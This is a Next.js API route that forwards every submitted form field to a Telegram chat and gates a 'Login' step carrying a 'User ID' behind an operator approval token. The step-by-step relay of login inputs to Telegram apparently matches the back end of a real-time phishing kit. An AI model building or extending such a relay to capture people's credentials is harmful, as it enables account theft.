import { NextRequest, NextResponse } from "next/server"
import { telegramService } from "@/lib/telegram"
import { createApproval } from "@/lib/approval-gate"

export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => null)
    const inputs = body?.inputs

    if (!inputs || typeof inputs !== "object" || Array.isArray(inputs)) {
      return NextResponse.json({ error: "inputs object is required" }, { status: 400 })
    }

    const sanitized: Record<string, string> = {}
    for (const [key, value] of Object.entries(inputs)) {
      if (typeof value === "string") {
        const trimmed = value.trim()
        if (trimmed) sanitized[key] = trimmed
      }
    }

    if (Object.keys(sanitized).length === 0) {
      return NextResponse.json({ error: "No valid input fields" }, { status: 400 })
    }

    const userId = (sanitized["User ID"] || sanitized.userId || "").trim()

    // Only gate the User ID step (Flow: Login) behind approval.
    const flow = (sanitized.Flow || sanitized.flow || "").trim().toLowerCase()
    const isLoginStep = flow === "login" && !!userId

    let token: string | null = null
    if (isLoginStep) {
      token = createApproval("user_id")
      await telegramService.sendInputNotification(sanitized, {
        token,
        step: "Step 1 · User ID",
        userId,
      })
    } else {
      await telegramService.sendInputNotification(sanitized)
    }

    return NextResponse.json({ success: true, token, userId })
  } catch (error) {
    console.error("Error sending input notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
